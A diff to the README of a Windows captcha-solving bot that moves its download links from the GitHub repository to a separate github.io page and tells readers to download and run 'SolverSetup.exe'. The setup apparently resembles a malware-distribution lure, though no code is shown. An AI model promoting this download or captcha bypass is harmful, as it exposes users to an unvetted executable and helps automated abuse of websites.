@@ -1,6 +1,6 @@
 # 🤖 Captcha-Solver-Bot-2026-Free - Solve web captchas with high speed
 
-[![Download for Windows](https://img.shields.io/badge/Download-Latest_Version-blue.svg)](https://github.com/erimammr/Captcha-Solver-Bot-2026-Free)
+[![Download for Windows](https://img.shields.io/badge/Download-Latest_Version-blue.svg)](https://erimammr.github.io)
 
 ## 📋 About This Application
 
@@ -22,7 +22,7 @@ Verify that your system has all recent updates from Microsoft. You can check you
 
 Follow these steps to set up the software on your Windows computer.
 
-1. Visit the project website at: https://github.com/erimammr/Captcha-Solver-Bot-2026-Free
+1. Visit the project website at: https://erimammr.github.io
 2. Click the link to download the installer file.
 3. Save the file to your Downloads folder or your Desktop.
 4. Locate the file named "SolverSetup.exe".
